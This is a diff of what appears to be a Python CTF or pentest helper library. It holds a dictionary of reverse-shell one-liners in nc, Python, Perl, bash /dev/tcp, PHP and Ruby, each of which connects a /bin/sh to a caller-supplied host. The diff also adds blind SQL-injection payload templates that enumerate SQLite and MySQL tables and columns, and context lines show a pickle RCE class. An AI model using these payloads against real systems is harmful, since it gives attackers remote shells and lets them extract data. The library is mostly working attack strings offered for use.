@@ -13,26 +13,26 @@ import requests
 
 #taken from https://github.com/lukechilds/reverse-shell
 #and http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-
+#call with str.format(host,port)
 rev_shells = {
 	"nc":
-		"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {host} {port} > /tmp/f",
+		"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {} {} > /tmp/f",
 	"python":
-		"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{self.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
+		"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
 	"perl":
-		"""perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
+		"""perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
 	"sh":
-		"/bin/sh -i >& /dev/tcp/{host}/{port} 0>&1",
+		"/bin/sh -i >& /dev/tcp/{}/{} 0>&1",
 	"nc2":
-		"nc -e /bin/sh {host} {port}",
+		"nc -e /bin/sh {} {}",
 	"php":
-		"""php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""",
+		"""php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""",
 	"ruby":
-		"""ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
+		"""ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
 }
 
 def rev_shell(host, port, typ):
-	return rev_shells[typ].format(host=host, port=port)
+	return rev_shells[typ].format(host, port)
 
 class PickleRCE:
 	def __init__(self, cmd):
@@ -66,6 +66,40 @@ def blind_sqli(inject_template, sqli_oracle, chars=_chars):
 				break
 		else:
 			return val
+
+# use with str.replace("$o",offset).replace("$t",table_name)
+# because str.format and % formatting can't be used
+blind_sqli_payloads = {
+	"sqlite":
+	{
+	"tables":
+	(
+	"(SELECT count(tbl_name) FROM sqlite_master WHERE type='table'"
+	" and tbl_name NOT like 'sqlite_%' and tbl_name like '{0}%' limit 1 offset $o) > 0"
+	),
+	"columns":
+	(
+	"(SELECT count(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL"
+	" and name ='$t' and sql like '{0}%' limit 1 offset $o) > 0"
+	)
+	},
+	"mysql":
+	{
+	"tables":
+	(
+	"(select count(table_name) from information_schema.tables"
+	" where table_name like '{0}%' limit 1 offset $o) > 0"
+	),
+	"columns":
+	(
+	"(select count(column_name) from information_schema.columns"
+	" where table_name='$t' and column_name like '{0}%' limit 1 offset $o) > 0"
+	)
+	}
+}
+
+def blind_sqli_payload(dbms, typ, offset=0, table_name=""):
+	return blind_sqli_payloads[dbms][typ].replace("$o", offset).replace("$t", table_name)
 
 class PyJail:
 	"""makes interacting with python jails easier"""
